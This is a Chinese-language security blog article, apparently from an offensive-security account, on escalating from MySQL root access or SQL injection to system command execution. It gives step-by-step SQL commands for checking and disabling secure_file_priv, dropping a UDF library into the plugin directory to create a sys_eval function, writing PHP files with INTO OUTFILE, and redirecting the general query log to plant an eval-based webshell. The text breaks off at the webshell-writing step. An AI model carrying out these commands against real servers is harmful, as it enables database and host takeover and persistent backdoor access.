---
title: SQL注入提权思路详解
url: https://mp.weixin.qq.com/s/AmBQl7qdhvsOtfTscoCD7Q
source: Doonsec's feed
date: 2026-01-18
fetch_date: 2026-01-19T03:40:28.439412
---

# SQL注入提权思路详解

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/58HpNWd2k5iciaU3uSLEKBFoFEAZ0pcGIia4UKgTicLB8lYLfGoxmmwHgJpTH8uOSPmXktA5fSeTicwbncOwRVd955g/0?wx_fmt=jpeg)

# SQL注入提权思路详解

原创

Ly4j
Ly4j

Ly4j攻防手记

![]()

在小说阅读器中沉浸阅读

当取得mysql账号密码，或sql注入获取了高权限时，如果通过mysql获取系统权限？

# 1. 前置条件

* web目录具有写权限，能够使用单引号
* 知道网站绝对路径（根目录，或则是根目录往下的目录都行）
* secure\_file\_priv的值为空
* mysql为root权限

# 2. 权限查看

```
#查看版本
select version()
#查看当前用户名
SELECT CURRENT_USER();
```

查看当前用户权限

```
SHOW GRANTS;
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5iciaU3uSLEKBFoFEAZ0pcGIiaWObqdoSus8JIwzqN1Wbu8kEWj6FMgDpAMs31uPkMeHq0CfcticSFUfQ/640?wx_fmt=png&from=appmsg)

表示授予了 root 用户来自任何主机的所有数据库和所有表的所有权限，并且具有授权（GRANT）其他用户权限的能力。

* **GRANT ALL PRIVILEGES**: 授予所有权限，包括 SELECT、INSERT、UPDATE、DELETE 等。
* **ON \*.\***: 应用于所有数据库和所有表。
* **TO 'root'@'%'**: 授权给用户名为 'root' 的用户，可以从任何主机（%）连接。
* **WITH GRANT OPTION**: 允许该用户授予（GRANT）其拥有的权限给其他用户。这是一个强大的权限，因为允许用户管理其他用户的权限。

# 3. secure\_file\_priv 介绍

secure\_file\_priv 是 MySQL 中的一个全局系统变量，用于限制 MySQL 服务器进行文件读写操作的目录范围，主要用于防止数据库被利用于读写系统文件。

受影响的语句

|  |  |  |
| --- | --- | --- |
| **语句** | **作用** | **是否受 secure\_file\_priv 限制** |
| SELECT ... INTO OUTFILE | 导出数据到文件 | ✅ 限制 |
| LOAD DATA INFILE | 从文件导入数据 | ✅ 限制 |
| LOAD\_FILE() | 读取服务器端文件内容 | ✅ 限制 |
| CREATE FUNCTION ... SONAME | 安装插件函数 | ✅ 限制（间接） |

不同取值的含义

|  |  |
| --- | --- |
| **secure\_file\_priv 值** | **含义** |
| NULL | 限制 mysqld 不允许导入、导出、读取文件 |
| 为具体目录：/tmp/mysql-files/ | 仅允许在该目录下进行文件读写操作 |
| 空值（即不设置） | 不对mysqld 的导入导出做限制 |

MySQL 5.6.34 开始，secure\_file\_priv 的默认值为 NULL。即默认禁止所有文件导入导出操作。

查看当前配置值

```
select @@secure_file_priv
#
show global variables like '%secure%';
```

如下为空，则可以导入导出

![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5iciaU3uSLEKBFoFEAZ0pcGIiaNhhtRdr55H3FauSF9SicjxGnDFuvnNgv0gnz7Ns7UYWAHZdP2bgmezA/640?wx_fmt=png&from=appmsg)

若不为空，则需要修改MySQL 配置文件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5iciaU3uSLEKBFoFEAZ0pcGIiaOaicgicTb4nHN9Cak011YRdJs8HHCgBtvzMqh5zNuiaS65ghJiaVoP3ibJQ/640?wx_fmt=png&from=appmsg)

1. linux下mysql修改

如mysql5.7

```
vim /etc/mysql/mysql.conf.d/mysqld.cnf
#在 [mysqld] 下面添加如下
secure_file_priv = ''
#重启mysql
service mysql restart
```

2. windows中，则修改mysql/my.ini，添加secure\_file\_priv = ''

# 4. secure\_file\_priv 存在具体值时

当 secure\_file\_priv 存在具体值时，表示只能在该目录及其子目录下进行文件读写操作，其他目录的文件操作会被拒绝。

1. 当“secure\_file\_priv 存在具体值时：/tmp/mysql-files

![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5iciaU3uSLEKBFoFEAZ0pcGIiaubLibAiaA6bE9rq6AkQnBgo1k1AM7wDLgVhRKciaV3YdR9dlwPvTwfnHA/640?wx_fmt=png&from=appmsg)

2. 执行写入操作

```
SELECT 123 INTO OUTFILE '/tmp/mysql-files/1.txt';
```

成功写入

![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5iciaU3uSLEKBFoFEAZ0pcGIiaLWmHyRwcSIMc0IsgbXECggcydr3uoS8K74YRBvUPdiaaazhAnrJMWKQ/640?wx_fmt=png&from=appmsg)

但是要写入的前提是/tmp/mysql-files目录mysql用户有写入权限，否则还是会被拒绝。真实环境中很可能没有这个目录的写入权限。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5iciaU3uSLEKBFoFEAZ0pcGIiaRdchAC23RE5WyXxWCQeuEro7UibU6tVVXE4gPBcqBZs0jQt4N4g1fBw/640?wx_fmt=png&from=appmsg)

3. 那如果有个其他目录是 777 权限，能否写入？如/tmp/test 目录

![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5iciaU3uSLEKBFoFEAZ0pcGIiaXIPUbPePsT5hnLPbmCV53iczpBx9lQNibdhibj6lePaTvDzkE8eact2ibw/640?wx_fmt=png&from=appmsg)

答案是不行，因为 secure\_file\_priv 规定了只能往 /tmp/mysql-files/ 中写文件，往任何其他目录写入文件都会被拒绝

![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5iciaU3uSLEKBFoFEAZ0pcGIiagr1uggZ91nchxFbvics73VyaGZo0BltucjHiaaicUNSKWgwpAmsajlEPg/640?wx_fmt=png&from=appmsg)

4. 那能够读取文件？

```
SELECT LOAD_FILE('/tmp/mysql-files/1.txt') AS file_content
```

/tmp/mysql-files 下的文件可以成功读取

![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5iciaU3uSLEKBFoFEAZ0pcGIiaZg0rq2F6PuiaGEx0WoEWKxtNLnnbpicicTakcro1rPJka0pCWUctzxItw/640?wx_fmt=png&from=appmsg)

如果读取其他目录文件会显示为空

```
SELECT LOAD_FILE('/tmp/test/test.txt') AS file_content;
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5iciaU3uSLEKBFoFEAZ0pcGIiaal67M7NreVyOCEPEh9iciaSnsSHrHIeDotEzlJ4YxwcpKYp2eGEO4iarw/640?wx_fmt=png&from=appmsg)

## 4.1. 尝试提权？

1. 查看当前用户名为 root

```
SELECT CURRENT_USER();
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5iciaU3uSLEKBFoFEAZ0pcGIiatqVbalEkuzQLAjNHRjyb64zqsRFAQE3UVfHqFDtUFs5c7fwicwNUSmw/640?wx_fmt=png&from=appmsg)

2. 查看 secure\_file\_priv 的值为 /tmp/mysql-files/

```
select @@secure_file_priv
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5iciaU3uSLEKBFoFEAZ0pcGIiaDZB1YDo7ibU6l40MFWhzQECCfnib8lKedyCfLvOkpOTNtjnyL3BWDecw/640?wx_fmt=png&from=appmsg)

3. 查看插件目录：/www/server/mysql/lib/plugin/

```
SELECT @@plugin_dir;
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5iciaU3uSLEKBFoFEAZ0pcGIiariaTCrn2q4TzTIzKAHTPDgiajhhr2T1drKBOkRyjEtBM22gtu28DSYpA/640?wx_fmt=png&from=appmsg)

4. 写入动态链接库

https://www.sqlsec.com/udf/

```
SELECT 0x..000 INTO DUMPFILE '/www/server/mysql/lib/plugin/udf.so';
```

无法写入，因为上面说了，secure\_file\_priv 的值为 /tmp/mysql-files/，所以不允许往其他目录进行写操作

![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5iciaU3uSLEKBFoFEAZ0pcGIiahDiaQn5LWOYYGZfiboO5jU7TIdBibUe31Por3ml1f1brzupOz1E6YbxQA/640?wx_fmt=png&from=appmsg)

**如果secure\_file\_priv 的值为插件目录**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5iciaU3uSLEKBFoFEAZ0pcGIiaR6WQ7FY6HS4kRbiaC6MNdCW86vZPHibSwv2Rrc7EgQbiaspyylnaeibcjQ/640?wx_fmt=png&from=appmsg)

且 mysql 有写入权限

![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5iciaU3uSLEKBFoFEAZ0pcGIiaEWGiaiapkRetRUCWMYIJziba77qlSXk8B2wLdlUnCD1jQvyIDtuxwzqGg/640?wx_fmt=png&from=appmsg)

此时即可提权

```
SELECT 0x..000 INTO DUMPFILE '/www/server/mysql/lib/plugin/udf.so';
#创建函数 sys_eval
create function sys_eval returns string soname 'udf.so'
#执行命令
select sys_eval("whoami");
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5iciaU3uSLEKBFoFEAZ0pcGIiawaFA5cv6V67JIyMksLSibias4hHc3x1JdwiaHN17pUA8D6NhT8kI0xictg/640?wx_fmt=png&from=appmsg)

# 5. Mysql提权方式介绍

## 5.1. 写 webshell

### 5.1.1. INTO OUTFILE 写 shell

* 测试环境：mysql5.7.27

**windows测试**

1. 写入文件测试

```
#注意SELECT需要大写
SELECT 123 INTO OUTFILE 'C:\\phpStudy\\PHPTutorial\\WWW\\1.txt';
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5iciaU3uSLEKBFoFEAZ0pcGIiaaUKEdNz1ejA1gJJrXcUNluJ31bb5AHL7YXzpGNven7fxpeb73x0xRA/640?wx_fmt=png&from=appmsg)

2. 写入PHP文件

```
#如果1.php文件存在则会报错
SELECT '<?php phpinfo();?>' INTO OUTFILE 'C:\\phpStudy\\PHPTutorial\\WWW\\1.php';
```

**Linux测试**

当Mysql或mariaDB安装在linux下时，也可以使用into outfile写入文件。不过，一般情况下 Linux 系统下面权限分配比较严格，MySQL 用户一般情况下是无法直接往站点根目录写入文件的，这种情况下在 Windows 环境下成功率会很高。得碰运气

![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5iciaU3uSLEKBFoFEAZ0pcGIiaTwLEjNtQhaE1LHETwN8FibibXzCLYs84FVkVlNwpjCvSQrSAEPoErq4A/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5iciaU3uSLEKBFoFEAZ0pcGIiak4wRfpsVIfZsZURG4YBCCteGHKD97UcYeJMmJLYlQsgrH6xzrxUOkw/640?wx_fmt=png&from=appmsg)

### 5.1.2. 日志文件写shell

MySQL 5.0版本以上会创建日志文件，我们通过修改日志文件的全局变量，就可以Getshell

利用前提

* mysql > 5.0版本
* 知道根目录

1. 查看数据库版本大于5.0，那么应该可以通过日志写入shell

![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5iciaU3uSLEKBFoFEAZ0pcGIia3dW8Iyu35Qmtqhe4EBBC1SEXMjmLJMM64ic4tHH9XV2Kn9ySDfHQo4w/640?wx_fmt=png&from=appmsg)

2. 查看日志读写功能是否开启

```
show variables like '%general%';
```

该功能默认是关闭的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5iciaU3uSLEKBFoFEAZ0pcGIiavwIsLFFUiaMfDS3Anw7qUD0Hn1tEEkeBYllmOoXX7oOpTWrPXiaA3GvQ/640?wx_fmt=png&from=appmsg)

sqlmap 时建议执行如下

```
SELECT @@general_log;
```

* 返回 `1` 表示开启
* 返回 `0` 表示关闭

![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5iciaU3uSLEKBFoFEAZ0pcGIiatZxpIia2RjmfRKfic90UfMSm5iaGt2Iibusyo4ia0x7eAoAibOvVKpeZ19SQ/640?wx_fmt=png&from=appmsg)

3. 打开日志读写功能

```
SET GLOBAL general_log='on'
```

然后再查看变为了“on”，成功开启

![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5iciaU3uSLEKBFoFEAZ0pcGIiat6ym1ribicMVKf3ZuWun4ojQeJMyXHNaCYGELFibLzlrD9W9kic9m0Ytfg/640?wx_fmt=png&from=appmsg)

4. 指定日志文件为shell2.php

需要指定根目录

```
set global general_log_file = 'E:\\phpStudy\\PHPTutorial\\www\\shell2.php'
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5iciaU3uSLEKBFoFEAZ0pcGIiaU5SMnKFU5230zUjQiaiaYic2icvsiabplmFLTxMzHybxuqEU68YOicialCnLw/640?wx_fmt=png&from=appmsg)

5. 写shell到shell2.php文件中

```
select '<?php @eval($_POST["cmd"]); ?>'
```

...